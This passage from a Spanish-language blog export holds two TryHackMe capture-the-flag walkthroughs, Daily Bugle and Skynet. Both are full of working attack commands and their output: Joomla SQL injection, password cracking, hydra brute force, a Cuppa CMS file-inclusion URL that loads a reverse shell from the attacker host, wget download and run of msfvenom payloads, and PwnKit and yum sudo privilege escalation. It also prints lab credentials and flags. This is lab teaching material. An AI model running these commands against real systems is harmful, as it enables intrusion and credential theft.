)(_)( )(_)( ) ( \\__ \\( (__ /(__)\\ ) ( \\____) (_____)(_____)(_/\\/\\_)(___/ \\___)(__)(__)(_)\\_) (1337.today) --=[owasp joomscan +---++---==[version : 0.0.7 +---++---==[update date : [2018/09/23] +---++---==[authors : mohammad reza espargham , ali razmjoo --=[code name : self challenge @owasp_joomscan , @rezesp , @ali_razmjo0 , @owasp processing http://10.10.53.147/administrator/ ... [+] firewall detector [++] firewall not detected [+] detecting joomla version [++] joomla 3.7.0 [+] core joomla vulnerability [++] target joomla core is not vulnerable [+] checking directory listing [++] directory has directory listing : http://10.10.53.147/administrator/components http://10.10.53.147/administrator/modules http://10.10.53.147/administrator/templates http://10.10.53.147/administrator/includes http://10.10.53.147/administrator/language http://10.10.53.147/administrator/templatesll encuentro varias vulnerabilidades para la versio 3.7 de joomla. ❯ searchsploit joomla 3.7 -w -------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------- exploit title | url -------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------- joomla! 3.7 - sql injection | https://www.exploit-db.com/exploits/44227 joomla! 3.7.0 - \u0026#39;com_fields\u0026#39; sql injection | https://www.exploit-db.com/exploits/42033 joomla! component ari quiz 3.7.4 - sql injection | https://www.exploit-db.com/exploits/46769 joomla! component com_realestatemanager 3.7 - sql injection | https://www.exploit-db.com/exploits/38445 joomla! component easydiscuss \u0026lt; 4.0.21 - cross-site scripting | https://www.exploit-db.com/exploits/43488 joomla! component j2store \u0026lt; 3.3.7 - sql injection | https://www.exploit-db.com/exploits/46467 joomla! component jomestate pro 3.7 - \u0026#39;id\u0026#39; sql injection | https://www.exploit-db.com/exploits/44117 joomla! component jtag members directory 5.3.7 - arbitrary file download | https://www.exploit-db.com/exploits/43913 joomla! component quiz deluxe 3.7.4 - sql injection | https://www.exploit-db.com/exploits/42589 -------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------- shellcodes: no results encuentro un posible exploit en https://www.exploit-db.com/exploits/42033 paso 3 ataco con sqli usando sqlmap. sqlmap -u \u0026#34;http://10.10.53.147/administrator/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] otra opción es el script https://github.com/incredibleindishell/exploit-code-by-me/tree/43f3976ee02430762bbe02642dc8df82385b7cca/joomla-sql-injection-3.7 busca una tercera opcion valida, encuentro el script https://github.com/stefanlucas/exploit-joomla ❯ python2 joomblah.py http://10.10.53.147 .---. .-\u0026#39;\u0026#39;\u0026#39;-. .-\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39; _ \\ \u0026#39; _ \\ .---. \u0026#39;---\u0026#39; / /` \u0026#39;. \\ / /` \u0026#39;. \\ __ __ ___ /| | | . .---.. | \\ \u0026#39; . | \\ \u0026#39; | |/ `.\u0026#39; `. || | | .\u0026#39;| | || \u0026#39; | \u0026#39;| \u0026#39; | \u0026#39;| .-. .-. \u0026#39;|| | | \u0026lt; | | |\\ \\ / / \\ \\ / / | | | | | ||| __ | | __ | | | | `. ` ..\u0026#39; / `. ` ..\u0026#39; / | | | | | |||/\u0026#39;__ \u0026#39;. | | .:--.\u0026#39;. | | .\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39;-...-\u0026#39;` \u0026#39;-...-\u0026#39;` | | | | | ||:/` \u0026#39;. \u0026#39;| |/ | \\ | | |/.\u0026#39;\u0026#39;\u0026#39;. \\ | | | | | | | ||| | || |`\u0026#34; __ | | | / | | | | |__| |__| |__|||\\ / \u0026#39;| | .\u0026#39;.\u0026#39;\u0026#39;| | | | | | __.\u0026#39; \u0026#39; |/\u0026#39;..\u0026#39; / \u0026#39;---\u0026#39;/ / | |_| | | | | \u0026#39; \u0026#39; `\u0026#39;-\u0026#39;` \\ \\._,\\ \u0026#39;/| \u0026#39;. | \u0026#39;. |____.\u0026#39; `--\u0026#39; `\u0026#34; \u0026#39;---\u0026#39; \u0026#39;---\u0026#39; [-] fetching csrf token [-] testing sqli - found table: fb9j5_users - extracting users from fb9j5_users [$] found user [u\u0026#39;811\u0026#39;, u\u0026#39;super user\u0026#39;, u\u0026#39;jonah\u0026#39;, u\u0026#39;jonah@tryhackme.com\u0026#39;, u\u0026#39;$2y$10$0veo/jsfh4389lluc4xya.dfy2mf.bzhz0jvmw.v.d3p12kbtzutm\u0026#39;, u\u0026#39;\u0026#39;, u\u0026#39;\u0026#39;] - extracting sessions from fb9j5_session uso john the ripper con el hash obtenido. password → spiderman123 ❯ john password.txt --wordlist=/usr/share/wordlists/rockyou.txt using default input encoding: utf-8 loaded 1 password hash (bcrypt [blowfish 32/64 x3]) cost 1 (iteration count) is 1024 for all loaded hashes will run 24 openmp threads press \u0026#39;q\u0026#39; or ctrl-c to abort, almost any other key for status spiderman123 (?) 1g 0:00:00:47 done (2023-09-03 10:50) 0.02120g/s 994.1p/s 994.1c/s 994.1c/s 060494..setsuna use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably session completed. paso 4 intento subir fichero php para reverse shell sin exito. buscando en internet encuentro https://www.hackingarticles.in/joomla-reverse-shell/ asi que modifico un fichero php para lograrlo. ❯ rlwrap nc -lvnp 1234 listening on [any] 1234 ... connect to [10.14.50.184] from (unknown) [10.10.53.147] 48678 linux dailybugle 3.10.0-1062.el7.x86_64 #1 smp wed aug 7 18:08:02 utc 2019 x86_64 x86_64 x86_64 gnu/linux 05:14:22 up 2:06, 0 users, load average: 0.00, 0.03, 0.15 user tty from login@ idle jcpu pcpu what uid=48(apache) gid=48(apache) groups=48(apache) sh: no job control in this shell sh-4.2$ whoami whoami apache sh-4.2$ estabilizo shell. python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; export term=xterm en mi equipo, creo un payload con msfvenom para descargarlo en /tmp en la maquina remota. msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell lhost=10.x.x.x lport=4444 en maquina objetivo ejecuto: wget http://10.x.x.x:8080/shell http request sent, awaiting response... 200 ok length: 250 [application/octet-stream] saving to: \u0026#39;shell\u0026#39; 100%[======================================\u0026gt;] 250 --.-k/s in 0s 2023-09-03 05:18:08 (954 kb/s) - \u0026#39;shell\u0026#39; saved [250/250] bash-4.2$ ls ls shell bash-4.2$ chmod +x shell chmod +x shell bash-4.2$ ./shell paso 5 abro metasploit y selecciono multihandler exploit y payload meterpreter/reverse_tcp msf6 \u0026gt; use exploit/multi/handler msf6 exploit(multi/handler) \u0026gt; set payload linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; run [*] started reverse tcp handler on 10.14.50.184:4444 [*] sending stage (3045380 bytes) to 10.10.53.147 [*] meterpreter session 1 opened (10.14.50.184:4444 -\u0026gt; 10.10.53.147:34128) at 2023-09-03 11:22:51 +0200 meterpreter \u0026gt; cargo el modulo local_exploit_suggester y lo ejecuto. msf6 exploit(multi/handler) \u0026gt; search exploit suggester matching modules ================ # name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 post/multi/recon/local_exploit_suggester normal no multi recon local exploit suggester interact with a module by name or index. for example info 0, use 0 or use post/multi/recon/local_exploit_suggester msf6 exploit(multi/handler) \u0026gt; use 0 msf6 post(multi/recon/local_exploit_suggester) \u0026gt; sessions active sessions =============== id name type information connection -- ---- ---- ----------- ---------- 1 meterpreter x64/linux apache @ 10.10.53.147 10.14.50.184:4444 -\u0026gt; 10.10.53.147:34128 (10.10.53.147) msf6 post(multi/recon/local_exploit_suggester) \u0026gt; set session 1 session =\u0026gt; 1 msf6 post(multi/recon/local_exploit_suggester) \u0026gt; run [*] 10.10.53.147 - collecting local exploits for x64/linux... [*] 10.10.53.147 - 186 exploit checks are being tried... [+] 10.10.53.147 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: the target is vulnerable. [+] 10.10.53.147 - exploit/linux/local/network_manager_vpnc_username_priv_esc: the service is running, but could not be validated. [+] 10.10.53.147 - exploit/linux/local/pkexec: the service is running, but could not be validated. [+] 10.10.53.147 - exploit/linux/local/ptrace_traceme_pkexec_helper: the target appears to be vulnerable. [+] 10.10.53.147 - exploit/linux/local/su_login: the target appears to be vulnerable. [+] 10.10.53.147 - exploit/linux/local/sudo_baron_samedit: the target appears to be vulnerable. sudo 1.8.23 is a vulnerable build. [+] 10.10.53.147 - exploit/linux/local/sudoedit_bypass_priv_esc: the target appears to be vulnerable. sudo 1.8.23 is vulnerable, but unable to determine editable file. os can not be exploited by this module [*] running check method for exploit 63 / 63 [*] 10.10.53.147 - valid modules for session 1: ============================ # name potentially vulnerable? check result - ---- ----------------------- ------------ 1 exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec yes the target is vulnerable. 2 exploit/linux/local/network_manager_vpnc_username_priv_esc yes the service is running, but could not be validated. 3 exploit/linux/local/pkexec yes the service is running, but could not be validated. 4 exploit/linux/local/ptrace_traceme_pkexec_helper yes the target appears to be vulnerable. 5 exploit/linux/local/su_login yes the target appears to be vulnerable. 6 exploit/linux/local/sudo_baron_samedit yes the target appears to be vulnerable. sudo 1.8.23 is a vulnerable build. 7 exploit/linux/local/sudoedit_bypass_priv_esc yes the target appears to be vulnerable. sudo 1.8.23 is vulnerable, but unable to determine uso exploit cve_2021_4034_pwnkit_lpe_pkexec msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) \u0026gt; show options module options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec): name current setting required description ---- --------------- -------- ----------- pkexec_path no the path to pkexec binary session yes the session to run this module on writable_dir /tmp yes a directory where we can write files payload options (linux/x64/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- lhost yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 x86_64 view the full module info with the info, or info -d command. msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) \u0026gt; run [-] msf::optionvalidateerror the following options failed to validate: session msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) \u0026gt; set session 1 session =\u0026gt; 1 msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) \u0026gt; run [*] started reverse tcp handler on [*] running automatic check (\u0026#34;set autocheck false\u0026#34; to disable) [!] verify cleanup of /tmp/.tlhznymlpvc [+] the target is vulnerable. [*] writing \u0026#39;/tmp/.adasqfiitd/zraeisswkke/zraeisswkke.so\u0026#39; (548 bytes) ... [!] verify cleanup of /tmp/.adasqfiitd [*] sending stage (3045380 bytes) to 10.10.53.147 [+] deleted /tmp/.adasqfiitd/zraeisswkke/zraeisswkke.so [+] deleted /tmp/.adasqfiitd/.dnnzjbsapkm [+] deleted /tmp/.adasqfiitd [*] meterpreter session 2 opened (10. -\u0026gt; 10.10.53.147:34132) at 2023-09-03 11:38:41 +0200 paso 6 obtengo acceso root y busco flags. meterpreter \u0026gt; getuid server username: root meterpreter \u0026gt; search -f user.txt found 1 result... ================= path size (bytes) modified (utc) ---- ------------ -------------- /home/jjameson/user.txt 33 2019-12-16 01:47:48 +0100 meterpreter \u0026gt; search -f root.txt found 1 result... ================= path size (bytes) modified (utc) ---- ------------ -------------- /root/root.txt 33 2019-12-16 01:47:19 +0100 meterpreter \u0026gt; cat /home/jjameson/user.txt 27a260fe3cba712cfdedb1c86d80442e meterpreter \u0026gt; cat /root/root.txt eec3d53292b1821868266858d7fa6f79 la opción que proponía la sala era usar el binario yum, para ello habia que obtener acceslo como usuario local despues de revisar el fichero configuration.php en /var/www/html meterpreter \u0026gt; cat configuration.php \u0026lt;?php class jconfig { public $offline = \u0026#39;0\u0026#39;; public $offline_message = \u0026#39;this site is down for maintenance.\u0026lt;br /\u0026gt;please check back again soon.\u0026#39;; public $display_offline_message = \u0026#39;1\u0026#39;; public $offline_image = \u0026#39;\u0026#39;; public $sitename = \u0026#39;the daily bugle\u0026#39;; public $editor = \u0026#39;tinymce\u0026#39;; public $captcha = \u0026#39;0\u0026#39;; public $list_limit = \u0026#39;20\u0026#39;; public $access = \u0026#39;1\u0026#39;; public $debug = \u0026#39;0\u0026#39;; public $debug_lang = \u0026#39;0\u0026#39;; public $dbtype = \u0026#39;mysqli\u0026#39;; public $host = \u0026#39;localhost\u0026#39;; public $user = \u0026#39;root\u0026#39;; public $password = \u0026#39;nv5uz9r3zedzvjnu\u0026#39;; public $db = \u0026#39;joomla\u0026#39;; public $dbprefix = \u0026#39;fb9j5_\u0026#39;; public $live_site = \u0026#39;\u0026#39;; public $secret = \u0026#39;uambrwzho3ofpmvc\u0026#39;; al logarse con esas credenciales, se buscaría la bandera de usuario y despues buscaría que binario puede ejecutar sudo -l matching defaults entries for jjameson on dailybugle: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;colors display hostname histsize kdedir ls_colors\u0026#34;, env_keep+=\u0026#34;mail ps1 ps2 qtdir username lang lc_address lc_ctype\u0026#34;, env_keep+=\u0026#34;lc_collate lc_identification lc_measurement lc_messages\u0026#34;, env_keep+=\u0026#34;lc_monetary lc_name lc_numeric lc_paper lc_telephone\u0026#34;, env_keep+=\u0026#34;lc_time lc_all language linguas _xkb_charset xauthority\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin user jjameson may run the following commands on dailybugle: (all) nopasswd: /usr/bin/yum en https://gtfobins.github.io/gtfobins/yum/ viene el siguiente exploit: tf=$(mktemp -d) cat \u0026gt;$tf/x\u0026lt;\u0026lt;eof [main] plugins=1 pluginpath=$tf pluginconfpath=$tf eof cat \u0026gt;$tf/y.conf\u0026lt;\u0026lt;eof [main] enabled=1 eof cat \u0026gt;$tf/y.py\u0026lt;\u0026lt;eof import os import yum from yum.plugins import pluginyumexit, type_core, type_interactive requires_api_version=\u0026#39;2.1\u0026#39; def init_hook(conduit): os.execl(\u0026#39;/bin/sh\u0026#39;,\u0026#39;/bin/sh\u0026#39;) eof sudo yum -c $tf/x --enableplugin=y conclusion una sala muy divertida con tématica de spiderman, mi superhéroe favorito. esta vez la sala tenía la etiqueta dificil, y la verdad es que he notado el pequeño salto de nivel. me ha llevado unas 3 horas poder completarla, me encontré varios callejones sin salida con el sqli de joomla hasta que di con el script de python. para conseguir las banderas usé directamente el exploit suggester de metasploit en vez de listar los binarios que podía ejecutar el usuario local (revisando la configuración del site en /var/www/html) y aprovechando el binario /bin/yum para obtener acceso privilegiado como sugiere la sala.\n(◕‿‿◕) hack the planet! ","title":"Daily Bugle [TryHackMe]"},{"date":"2023-09-02","image":"/images/post_pics/skynet/skynet.jpeg","link":"https://k3ssdev.github.io/posts/skynet/","summary":"Introducción Me enfrento a la primera máquina de \u0026ldquo;Offensive Pentesting\u0026rdquo; que no tiene sugerencias de que ir haciendo. En este caso, se trata de una máquina de nivel fácil, por lo que no debería ser muy complicada aún sin las recomendaciones que proporcionaban las anteriores salas.","tags":["Burp","Dirb","Easy","Intruder","Linux","Metasploit","Meterpreter","msfvenom","Privilege Escalation","SMB","TryHackMe"],"text":"introducción me enfrento a la primera máquina de \u0026ldquo;offensive pentesting\u0026rdquo; que no tiene sugerencias de que ir haciendo. en este caso, se trata de una máquina de nivel fácil, por lo que no debería ser muy complicada aún sin las recomendaciones que proporcionaban las anteriores salas. el objetivo es obtener acceso a la máquina y obtener la flag del usuario y la flag del root.\ntask 1 - deploy and compromise the vulnerable machine! paso 1 pongo la máquina en marcha y accedo a la aplicación web que tiene. escaneo la máquina con un nmap en 2 pasos. sudo nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial \u0026lt;ip\u0026gt; ports=$(cat nmap_inicial | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f1 | xargs | tr \u0026#39; \u0026#39; \u0026#39;,\u0026#39;) sudo nmap -p$ports -sc -sv -pn -on nmap_final \u0026lt;ip\u0026gt; puertos de ssh, servidor web apache, servidores de correo y samba. sistema operativo linux ubuntu. port state service version 22/tcp open ssh openssh 7.2p2 ubuntu 4ubuntu2.8 (ubuntu linux; protocol 2.0) | ssh-hostkey: | 2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (rsa) | 256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ecdsa) |_ 256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ed25519) 80/tcp open http apache httpd 2.4.18 ((ubuntu)) |_http-server-header: apache/2.4.18 (ubuntu) |_http-title: skynet 110/tcp open pop3 dovecot pop3d |_pop3-capabilities: auth-resp-code pipelining sasl capa uidl top resp-codes 139/tcp open netbios-ssn samba smbd 3.x - 4.x (workgroup: workgroup) 143/tcp open imap dovecot imapd |_imap-capabilities: more login-referrals post-login literal+ have pre-login capabilities idle logindisableda0001 imap4rev1 sasl-ir listed enable ok id 445/tcp open @nnu samba smbd 4.3.11-ubuntu (workgroup: workgroup) service info: host: skynet; os: linux; cpe: cpe:/o:linux:linux_kernel paso 2 enumero samab con enum4linux y lo guardo en un fichero enum4linux -a 10.10.126.64 \u0026gt; samba_details reviso los resultados. ===================================( os information on 10.10.126.64 )=================================== 46 │ 47 │ 48 │ [e] can\u0026#39;t get os info with smbclient 49 │ 50 │ 51 │ [+] got os info for 10.10.126.64 from srvinfo: 52 │ skynet wk sv prq unx nt snt skynet server (samba, ubuntu) 53 │ platform_id : 500 54 │ os version : 6.1 55 │ server type : 0x809a03 56 │ 57 │ 58 │ =======================================( users on 10.10.126.64 )======================================= 59 │ 60 │ index: 0x1 rid: 0x3e8 acb: 0x00000010 account: milesdyson name: desc: 61 │ 62 │ user:[milesdyson] rid:[0x3e8] 63 │ 64 │ =================================( share enumeration on 10.10.126.64 )================================= 65 │ 66 │ 67 │ sharename type comment 68 │ --------- ---- ------- 69 │ print$ disk printer drivers 70 │ anonymous disk skynet anonymous share 71 │ milesdyson disk miles dyson personal share 72 │ ipc$ ipc ipc service (skynet server (samba, ubuntu)) 73 │ reconnecting with smb1 for workgroup listing. 74 │ 75 │ server comment 76 │ --------- ------- 77 │ 78 │ workgroup master 79 │ --------- ------- 80 │ workgroup skynet acceso anonymous user con smbclient. ❯ smbclient //10.10.126.64/anonymous password for [workgroup\\k3ss]: try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . d 0 thu nov 26 17:04:00 2020 .. d 0 tue sep 17 09:20:17 2019 attention.txt n 163 wed sep 18 05:04:59 2019 logs d 0 wed sep 18 06:42:16 2019 9204224 blocks of size 1024. 5831500 blocks available smb: \\\u0026gt; get attention.txt getting file \\attention.txt of size 163 as attention.txt (1,0 kilobytes/sec) (average 1,0 kilobytes/sec) nt_status_object_name_invalid opening remote file \\logs\\* smb: \\\u0026gt; get logs\\log logs\\log1.txt logs\\log2.txt logs\\log3.txt smb: \\\u0026gt; get logs\\log logs\\log1.txt logs\\log2.txt logs\\log3.txt smb: \\\u0026gt; get logs\\log1.txt getting file \\logs\\log1.txt of size 471 as logs\\log1.txt (3,1 kilobytes/sec) (average 2,1 kilobytes/sec) smb: \\\u0026gt; get logs\\log2.txt getting file \\logs\\log2.txt of size 0 as logs\\log2.txt (0,0 kilobytes/sec) (average 1,5 kilobytes/sec) smb: \\\u0026gt; get logs\\log3.txt getting file \\logs\\log3.txt of size 0 as logs\\log3.txt (0,0 kilobytes/sec) (average 1,2 kilobytes/sec) paso 3 enumero los directorios que haya en la web con dirb ❯ dirb http://10.10.126.64/ /usr/share/wordlists/dirb/common.txt ----------------- dirb v2.22 by the dark raver ----------------- start_time: sat sep 2 11:57:08 2023 url_base: http://10.10.126.64/ wordlist_files: /usr/share/wordlists/dirb/common.txt ----------------- generated words: 4612 ---- scanning url: http://10.10.126.64/ ---- ==\u0026gt; directory: http://10.10.126.64/admin/ ==\u0026gt; directory: http://10.10.126.64/config/ ==\u0026gt; directory: http://10.10.126.64/css/ + http://10.10.126.64/index.html (code:200|size:523) ==\u0026gt; directory: http://10.10.126.64/js/ + http://10.10.126.64/server-status (code:403|size:277) ==\u0026gt; directory: http://10.10.126.64/squirrelmail/ en squirrelmail hay un login, guardo el post request en un fichero post /squirrelmail/src/redirect.php http/1.1 host: 10.10.126.64 content-length: 81 cache-control: max-age=0 upgrade-insecure-requests: 1 origin: http://10.10.126.64 content-type: application/x-www-form-urlencoded user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/116.0.5845.111 safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 referer: http://10.10.126.64/squirrelmail/src/login.php accept-encoding: gzip, deflate accept-language: es-es,es;q=0.9 cookie: sqmsessid=tn1nf3uvf4cm77sboeo2ssshg0 connection: close login_username=mylesdyson\u0026amp;secretkey=test\u0026amp;js_autodetect_results=1\u0026amp;just_logged_in=1 uso burp intruder y tambien hydra para probar todas las contraseñas (se puede usar cualquiera de los dos métodos). ❯ hydra -l milesdyson -p /home/k3ss/documentos/tryhackme/skynet/nmap/log1.txt 10.10.126.64 http-post-form \u0026#34;/squirrelmail/src/login.php:login_username=^user^\u0026amp;secretkey=^pass^\u0026amp;js_autodetect_results=1\u0026amp;just_logged_in=1:login failed\u0026#34; -v -t 4 hydra v9.5 (c) 2023 by van hauser/thc \u0026amp; david maciejak - please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-02 12:27:55 [data] max 4 tasks per 1 server, overall 4 tasks, 31 login tries (l:1/p:31), ~8 tries per task [data] attacking http-post-form://10.10.126.64:80/squirrelmail/src/login.php:login_username=^user^\u0026amp;secretkey=^pass^\u0026amp;js_autodetect_results=1\u0026amp;just_logged_in=1:login failed [attempt] target 10.10.126.64 - login \u0026#34;milesdyson\u0026#34; - pass \u0026#34;cyborg007haloterminator\u0026#34; - 1 of 31 [child 0] (0/0) [attempt] target 10.10.126.64 - login \u0026#34;milesdyson\u0026#34; - pass \u0026#34;terminator22596\u0026#34; - 2 of 31 [child 1] (0/0) [attempt] target 10.10.126.64 - login \u0026#34;milesdyson\u0026#34; - pass \u0026#34;terminator219\u0026#34; - 3 of 31 [child 2] (0/0) [attempt] target 10.10.126.64 - login \u0026#34;milesdyson\u0026#34; - pass \u0026#34;terminator20\u0026#34; - 4 of 31 [child 3] (0/0) [80][http-post-form] host: 10.10.126.64 login: milesdyson password: cyborg007haloterminator [80][http-post-form] host: 10.10.126.64 login: milesdyson password: terminator22596 [80][http-post-form] host: 10.10.126.64 login: milesdyson password: terminator219 [80][http-post-form] host: 10.10.126.64 login: milesdyson password: terminator20 1 of 1 target successfully completed, 4 valid passwords found hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-02 12:27:55 reviso el correo y encuentro que se ha cambiado la contraseña de smb subject: samba password reset from: skynet@skynet date: tue, september 17, 2019 10:10 pm priority: normal options: view full header | view printable version | download this as a file we have changed your smb password after system malfunction. password: )s{a\u0026amp;2z=f^n_e.b` accedo con smbclient y descargo todo. ❯ smbclient //10.10.126.64/milesdyson -u milesdyson -c \u0026#34;recurse; mget *\u0026#34; reviso ficheros y encuentro uo llamado important.txt ❯ cat important.txt ───────┬──────────────────────────────────────────────────── │ file: important.txt ───────┼──────────────────────────────────────────────────── 1 │ 2 │ 1. add features to beta cms /45kra24zxs28v3yd 3 │ 2. work on t-800 model 101 blueprints 4 │ 3. spend more time with my wife ───────┴──────────────────────────────────────────────────── accedo al cms http://10.10.126.64/45kra24zxs28v3yd/ escaneo la url con dirby y encuentro que aloja cuppa cms ❯ dirb http://10.10.126.64/45kra24zxs28v3yd /usr/share/wordlists/dirb/common.txt ----------------- dirb v2.22 by the dark raver ----------------- start_time: sat sep 2 12:48:28 2023 url_base: http://10.10.126.64/45kra24zxs28v3yd/ wordlist_files: /usr/share/wordlists/dirb/common.txt ----------------- generated words: 4612 ---- scanning url: http://10.10.126.64/45kra24zxs28v3yd/ ---- ==\u0026gt; directory: http://10.10.126.64/45kra24zxs28v3yd/administrator/ paso 4 busco exploits conocidos. ❯ searchsploit cuppa -w -------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------- exploit title | url -------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------- cuppa cms - \u0026#39;/alertconfigfield.php\u0026#39; local/remote file inclusion | https://www.exploit-db.com/exploits/25971 -------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------- shellcodes: no results el codigo permite incluir archivos php locales o remotos o leer archivos que no sean php con esta vulnerabilidad. busco un reverse shell con php para usarlo. ❯ find /usr/share -iname \u0026#34;php-reverse-shell.php\u0026#34; 2\u0026gt;/dev/null /usr/share/laudanum/php/php-reverse-shell.php /usr/share/laudanum/wordpress/templates/php-reverse-shell.php /usr/share/webshells/php/php-reverse-shell.php uso el exploit para cargar el fichero php en el objetivo despues de haber creado un listener. http://10.10.126.64/45kra24zxs28v3yd/administrator/alerts/alertconfigfield.php?urlconfig=http://10.x.x.x/php-reverse-shell.php paso 5 conexión reverse shell ❯ rlwrap nc -lvnp 1234 listening on [any] 1234 ... connect to [10.x.x.x] from (unknown) [10.10.126.64] 43474 linux skynet 4.8.0-58-generic #63~16.04.1-ubuntu smp mon jun 26 18:08:51 utc 2017 x86_64 x86_64 x86_64 gnu/linux 06:02:14 up 2:06, 0 users, load average: 0.00, 0.00, 0.00 user tty from login@ idle jcpu pcpu what uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ estabilizo shell y busco flag del usuario. $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@skynet:/$ cd cd bash: cd: home not set www-data@skynet:/$ ls ls bin home\tlib64\topt\tsbin tmp vmlinuz.old boot initrd.img lost+found proc\tsnap usr dev initrd.img.old media\troot\tsrv var etc lib\tmnt\trun\tsys vmlinuz www-data@skynet:/$ cd home cd home www-data@skynet:/home$ ls ls milesdyson www-data@skynet:/home$ cd milesdyson cd milesdyson www-data@skynet:/home/milesdyson$ ls ls backups mail share user.txt www-data@skynet:/home/milesdyson$ cat user.txt cat user.txt 7ce5c2109a40f958099283600a9ae807 paso 6 creo un payload con msfvenom para obtener acceso con meterpreter y lo subo con wget ❯ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell lhost=10.x.x.x lport=4444 [-] no platform was selected, choosing msf::module::platform::linux from the payload [-] no arch selected, selecting arch: x64 from the payload no encoder specified, outputting raw payload payload size: 130 bytes final size of elf file: 250 bytes saved as: shell en metasploit ejecuto: msf6 \u0026gt; use linux/x64/meterpreter/reverse_tcp msf6 payload(linux/x64/meterpreter/reverse_tcp) \u0026gt; set lhost tun0 msf6 payload(linux/x64/meterpreter/reverse_tcp) \u0026gt; exploit [*] payload handler started as job 0 msf6 payload(linux/x64/meterpreter/reverse_tcp) \u0026gt; [*] started reverse tcp handler on 10.x.x.x:4444 [*] sending stage (3045380 bytes) to 10.10.126.64 [*] meterpreter session 1 opened (10.x.x.x:4444 -\u0026gt; 10.10.126.64:33592) at 2023-09-02 13:27:55 +0200 meterpreter \u0026gt; sysinfo computer : 10.10.126.64 os : ubuntu 16.04 (linux 4.8.0-58-generic) architecture : x64 buildtuple : x86_64-linux-musl meterpreter : x64/linux ejecuto el exploit suggeter de metasploit. meterpreter \u0026gt; run post/multi/recon/local_exploit_suggester [*] 10.10.126.64 - collecting local exploits for x64/linux... [*] 10.10.126.64 - 186 exploit checks are being tried... [+] 10.10.126.64 - exploit/linux/local/bpf_sign_extension_priv_esc: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/cve_2021_3493_overlayfs: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: the target is vulnerable. [+] 10.10.126.64 - exploit/linux/local/cve_2022_0995_watch_queue: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/glibc_realpath_priv_esc: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/pkexec: the service is running, but could not be validated. [+] 10.10.126.64 - exploit/linux/local/ptrace_traceme_pkexec_helper: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/su_login: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/sudo_baron_samedit: the target appears to be vulnerable. sudo 1.8.16 is a vulnerable build. [+] 10.10.126.64 - exploit/linux/local/ufo_privilege_escalation: the target appears to be vulnerable. [*] running check method for exploit 63 / 63 [*] 10.10.126.64 - valid modules for session 1: ============================ # name potentially vulnerable? check result - ---- ----------------------- ------------ 1 exploit/linux/local/bpf_sign_extension_priv_esc yes the target appears to be vulnerable. 2 exploit/linux/local/cve_2021_3493_overlayfs yes the target appears to be vulnerable. 3 exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec yes the target is vulnerable. 4 exploit/linux/local/cve_2022_0995_watch_queue yes the target appears to be vulnerable. 5 exploit/linux/local/glibc_realpath_priv_esc yes the target appears to be vulnerable. 6 exploit/linux/local/pkexec yes the service is running, but could not be validated. 7 exploit/linux/local/ptrace_traceme_pkexec_helper yes the target appears to be vulnerable. 8 exploit/linux/local/su_login yes the target appears to be vulnerable. 9 exploit/linux/local/sudo_baron_samedit yes the target appears to be vulnerable. sudo 1.8.16 is a vulnerable build. 10 exploit/linux/local/ufo_privilege_escalation yes the target appears to be vulnerable. uso el exploit exploit/linux/local/bpf_sign_extension_priv_esc https://www.rapid7.com/db/modules/exploit/linux/local/bpf_sign_extension_priv_esc/ msf6 payload(linux/x64/meterpreter/reverse_tcp) \u0026gt; use 